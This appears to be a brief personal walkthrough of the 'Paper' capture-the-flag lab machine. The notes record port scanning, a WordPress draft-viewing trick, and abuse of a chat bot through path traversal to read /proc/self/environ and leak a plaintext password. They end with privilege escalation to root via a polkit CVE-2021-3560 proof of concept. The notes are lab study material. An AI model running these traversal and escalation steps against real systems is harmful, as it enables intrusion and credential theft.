----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Paper
# 25/3/2023
10.10.11.143

----------------------------------------------------
# nmap
----------------------------------------------------
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)

----------------------------------------------------
# burp
----------------------------------------------------
on http header found office.paper
└─$ sudo nano /etc/hosts            
on office.paper wp is running 5.2.3 version

----------------------------------------------------
# exploit 
----------------------------------------------------
└─$ searchsploit wordpress 5.2.3
office.paper/?static=1


we got http://chat.office.paper/register/8qozr226AhkCHZdyY

now dm to the bot after sign in
recyclops file test.txt


recyclops file ../../../../../../proc/self/environ

we got 
dwight:Queenofblad3s!23

try to ssh it we got user shell

----------------------------------------------------
# after running linpease there is cve
----------------------------------------------------
https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/blob/main/poc.sh
[dwight@paper ~]$ ./expl -p=root
try multiple times
su - secnigma
root
sudo bash